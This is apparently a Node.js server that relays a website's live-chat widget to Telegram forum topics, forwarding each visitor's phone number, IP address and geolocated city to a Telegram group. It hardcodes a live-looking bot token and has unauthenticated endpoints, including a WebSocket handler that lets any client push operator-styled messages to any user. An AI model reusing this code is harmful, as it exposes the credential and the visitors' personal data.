const express = require('express');
const cors = require('cors');
const http = require('http');
const WebSocket = require('ws');
const app = express();

app.use(cors());
app.use(express.json({ limit: '50mb' }));

const BOT_TOKEN = '8743342099:AAGWRLBrNjd8YlkHPSeqOU64J4-0fJdILPg';
const GROUP_CHAT_ID = -1003911846697;
const SITE_URL = 'https://danil776-7.github.io';

const users = new Map();
const topicToUser = new Map();
const wsClients = new Map(); // userId -> WebSocket connection

const lastStatusUpdate = new Map();
const lastSentStatus = new Map();

// Создаем HTTP сервер
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// WebSocket соединения
wss.on('connection', (ws, req) => {
    console.log('🔌 Новое WebSocket соединение');
    
    let userId = null;
    
    ws.on('message', async (data) => {
        try {
            const message = JSON.parse(data);
            
            if (message.type === 'register') {
                userId = message.userId;
                wsClients.set(userId, ws);
                console.log(`✅ WebSocket зарегистрирован для ${userId}`);
                
                // Отправляем подтверждение
                ws.send(JSON.stringify({ type: 'registered', ok: true }));
            }
            
            if (message.type === 'new_message') {
                // Новое сообщение от оператора - отправляем клиенту
                const targetUserId = message.userId;
                const clientWs = wsClients.get(targetUserId);
                if (clientWs && clientWs.readyState === WebSocket.OPEN) {
                    clientWs.send(JSON.stringify({
                        type: 'message',
                        text: message.text,
                        isImage: message.isImage,
                        imageUrl: message.imageUrl,
                        timestamp: message.timestamp,
                        operatorName: message.operatorName
                    }));
                }
            }
        } catch (err) {
            console.error('WebSocket ошибка:', err);
        }
    });
    
    ws.on('close', () => {
        if (userId) {
            console.log(`🔌 WebSocket отключен для ${userId}`);
            wsClients.delete(userId);
        }
    });
});

function getAmsterdamTime(timestamp = null) {
    const date = timestamp ? new Date(timestamp * 1000) : new Date();
    return date.toLocaleString('ru-RU', {
        timeZone: 'Europe/Amsterdam',
        year: '2-digit',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });
}

async function getCountryByIp(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,city,timezone`);
        const data = await response.json();
        if (data.status === 'success') {
            return {
                country: data.country,
                countryCode: data.countryCode,
                city: data.city,
                timezone: data.timezone || 'Europe/Amsterdam'
            };
        }
    } catch (error) {}
    return { country: 'Нидерланды', countryCode: 'NL', city: 'Амстердам', timezone: 'Europe/Amsterdam' };
}

app.get('/', (req, res) => {
    res.json({ status: 'ok', message: 'Proxy работает с WebSocket!' });
});

app.post('/register', async (req, res) => {
    console.log('📞 РЕГИСТРАЦИЯ:', req.body);
    const { userId, ip, phone, region } = req.body;
    
    if (!userId || !phone) {
        return res.status(400).json({ ok: false, error: 'userId and phone required' });
    }
    
    try {
        let geo = { country: 'Нидерланды', countryCode: 'NL', city: 'Амстердам', timezone: 'Europe/Amsterdam' };
        if (ip && ip !== '127.0.0.1' && ip !== '::1') {
            geo = await getCountryByIp(ip);
        }
        
        const finalRegion = `${geo.country}${geo.city ? ', ' + geo.city : ''}`;
        const currentTime = getAmsterdamTime();
        
        const topic = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/createForumTopic`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: GROUP_CHAT_ID,
                name: `🟢 ${SITE_URL.replace('https://', '').replace('http://', '')}`,
                icon_color: 0x6FCF97
            })
        }).then(r => r.json());
        
        if (!topic.ok) {
            return res.status(500).json({ ok: false, error: topic.description });
        }
        
        const topicId = topic.result.message_thread_id;
        
        const infoMessage = `🔔 **НОВЫЙ ПОЛЬЗОВАТЕЛЬ!**\n\n` +
            `🆔 **ID:** ${userId}\n` +
            `🌐 **Сайт:** ${SITE_URL}\n` +
            `🌍 **IP:** ${ip}\n` +
            `📍 **Регион:** ${finalRegion}\n` +
            `📞 **Телефон:** ${phone}\n` +
            `🕐 **Время:** ${currentTime}`;
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: GROUP_CHAT_ID,
                message_thread_id: topicId,
                text: infoMessage,
                parse_mode: 'Markdown'
            })
        });
        
        users.set(userId, { 
            topicId, 
            phone, 
            region: finalRegion, 
            ip, 
            timezone: geo.timezone,
            registeredAt: currentTime,
            isOnline: true
        });
        topicToUser.set(topicId, userId);
        lastSentStatus.set(userId, true);
        
        console.log(`✅ Пользователь ${userId} зарегистрирован`);
        res.json({ ok: true, topicId });
        
    } catch (err) {
        console.error('Ошибка:', err);
        res.status(500).json({ ok: false, error: err.message });
    }
});

app.post('/send', async (req, res) => {
    const { userId, text, imageBase64 } = req.body;
    console.log('📨 Сообщение от:', userId);
    
    const user = users.get(userId);
    if (!user) {
        return res.status(400).json({ ok: false, error: 'Please register first' });
    }
    
    try {
        if (imageBase64) {
            const matches = imageBase64.match(/^data:image\/(\w+);base64,(.+)$/);
            if (matches) {
                const buffer = Buffer.from(matches[2], 'base64');
                const formData = new FormData();
                formData.append('chat_id', GROUP_CHAT_ID);
                formData.append('message_thread_id', user.topicId);
                formData.append('photo', new Blob([buffer]), 'image.jpg');
                if (text) formData.append('caption', `💬 **${userId}:**\n\n${text}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }
        } else if (text) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: GROUP_CHAT_ID,
                    message_thread_id: user.topicId,
                    text: `💬 **${userId}:**\n\n${text}`,
                    parse_mode: 'Markdown'
                })
            });
        }
        res.json({ ok: true });
    } catch (err) {
        console.error('Ошибка отправки:', err);
        res.status(500).json({ ok: false });
    }
});

app.post('/updateStatus', async (req, res) => {
    const { userId, isOnline, isActive, heartbeat } = req.body;
    
    const user = users.get(userId);
    if (!user) {
        return res.json({ ok: false, error: 'User not found' });
    }
    
    const now = Date.now();
    const lastUpdate = lastStatusUpdate.get(userId) || 0;
    const lastSent = lastSentStatus.get(userId);
    
    if (heartbeat) {
        return res.json({ ok: true, heartbeat: true });
    }
    
    if (lastSent !== isOnline && (now - lastUpdate) > 10000) {
        lastStatusUpdate.set(userId, now);
        lastSentStatus.set(userId, isOnline);
        user.isOnline = isOnline;
        
        const icon = isOnline ? '🟢' : '⚫️';
        const newName = `${icon} ${SITE_URL.replace('https://', '').replace('http://', '')}`;
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editForumTopic`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: GROUP_CHAT_ID,
                message_thread_id: user.topicId,
                name: newName
            })
        }).catch(err => console.error('Ошибка обновления топика:', err));
        
        console.log(`🔄 Статус ${userId}: ${isOnline ? 'ОНЛАЙН' : 'ОФЛАЙН'}`);
    }
    res.json({ ok: true });
});

// Webhook для получения сообщений из Telegram
app.post('/webhook', async (req, res) => {
    const update = req.body;
    res.sendStatus(200);
    
    try {
        const msg = update.message;
        if (!msg || !msg.chat || msg.chat.id !== GROUP_CHAT_ID) return;
        if (!msg.is_topic_message) return;
        
        const topicId = msg.message_thread_id;
        const userId = topicToUser.get(topicId);
        if (!userId) return;
        
        // Пропускаем сообщения от ботов и системные
        if (msg.from && msg.from.is_bot) return;
        if (msg.text && msg.text.includes('НОВЫЙ ПОЛЬЗОВАТЕЛЬ')) return;
        
        const ws = wsClients.get(userId);
        if (ws && ws.readyState === WebSocket.OPEN) {
            let imageUrl = null;
            let hasImage = false;
            
            if (msg.photo && msg.photo.length > 0) {
                try {
                    const photo = msg.photo[msg.photo.length - 1];
                    const fileResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${photo.file_id}`);
                    const fileData = await fileResponse.json();
                    if (fileData.ok) {
                        imageUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.result.file_path}`;
                        hasImage = true;
                    }
                } catch (err) {}
            }
            
            ws.send(JSON.stringify({
                type: 'message',
                text: msg.caption || msg.text || '',
                isImage: hasImage,
                imageUrl: imageUrl,
                timestamp: msg.date,
                operatorName: msg.from?.first_name || 'Оператор'
            }));
            console.log(`📨 WebSocket сообщение отправлено ${userId}`);
        }
    } catch (err) {
        console.error('Webhook ошибка:', err);
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`\n🚀 СЕРВЕР ЗАПУЩЕН!`);
    console.log(`📡 Порт: ${PORT}`);
    console.log(`🔌 WebSocket: ws://localhost:${PORT}`);
    console.log(`📡 Группа Telegram: ${GROUP_CHAT_ID}`);
    console.log(`🌐 Сайт: ${SITE_URL}`);
    console.log(`\n💡 Статус пользователя отображается иконкой в списке топиков: 🟢 - онлайн, ⚫️ - офлайн\n`);
});
